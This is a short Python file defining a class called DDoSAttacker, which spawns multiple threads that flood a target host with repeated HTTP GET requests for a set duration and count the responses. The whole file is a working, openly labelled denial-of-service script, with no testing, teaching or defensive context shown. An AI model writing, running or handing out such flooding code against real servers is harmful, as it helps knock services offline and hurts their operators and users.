import requests
import threading
import time
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DDoSAttacker:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.running = False
        self.request_count = 0
        self.success_count = 0
    
    def attack(self, duration=30):
        self.running = True
        worker_threads = []
        
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(duration,))
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        time.sleep(duration)
        self.running = False
        
        for t in worker_threads:
            t.join(timeout=5)
        
        return {
            'total_requests': self.request_count,
            'success_count': self.success_count
        }
    
    def worker(self, duration):
        timeout_start = time.time()
        
        while self.running and (time.time() - timeout_start) < duration:
            try:
                response = requests.get(f"http://{self.target}", timeout=5)
                self.request_count += 1
                if response.status_code == 200:
                    self.success_count += 1
            except:
                self.request_count += 1
            
            time.sleep(0.01)